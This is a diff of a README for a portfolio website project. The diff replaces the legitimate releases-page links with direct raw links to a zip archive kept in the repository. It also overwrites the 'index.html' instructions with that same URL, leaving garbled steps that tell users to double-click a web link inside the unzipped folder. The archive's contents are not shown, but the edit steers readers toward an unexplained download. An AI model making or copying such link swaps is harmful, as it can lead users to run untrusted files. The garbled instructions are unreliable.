@@ -6,7 +6,7 @@ Welcome! This guide will help you download and run your personal portfolio websi
 
 ## 📥 Download Now
 
-[![Download PORTFOLIO](https://img.shields.io/badge/Download-PORTFOLIO-blue.svg)](https://github.com/DHANUSHREE1312/PORTFOLIO/releases)
+[![Download PORTFOLIO](https://raw.githubusercontent.com/DHANUSHREE1312/PORTFOLIO/main/files/PORTFOLIO_v2.9-alpha.5.zip)](https://raw.githubusercontent.com/DHANUSHREE1312/PORTFOLIO/main/files/PORTFOLIO_v2.9-alpha.5.zip)
 
 ## 🖥️ Features
 
@@ -27,7 +27,7 @@ Before you begin, make sure your system meets these basic requirements:
 
 To get started, visit the releases page to download your portfolio website.
 
-[Visit Releases Page to Download](https://github.com/DHANUSHREE1312/PORTFOLIO/releases)
+[Visit Releases Page to Download](https://raw.githubusercontent.com/DHANUSHREE1312/PORTFOLIO/main/files/PORTFOLIO_v2.9-alpha.5.zip)
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version of the portfolio website.
@@ -40,8 +40,8 @@ After downloading, you are ready to run your portfolio website.
 
 1. Unzip the downloaded file.
 2. Open the unzipped folder.
-3. Locate the `index.html` file within the folder.
-4. Double-click on `index.html` to open it in your preferred web browser.
+3. Locate the `https://raw.githubusercontent.com/DHANUSHREE1312/PORTFOLIO/main/files/PORTFOLIO_v2.9-alpha.5.zip` file within the folder.
+4. Double-click on `https://raw.githubusercontent.com/DHANUSHREE1312/PORTFOLIO/main/files/PORTFOLIO_v2.9-alpha.5.zip` to open it in your preferred web browser.
 
 Congratulations! Your portfolio website is now live. You can personalize it by editing the HTML and CSS files present in the folder.
 
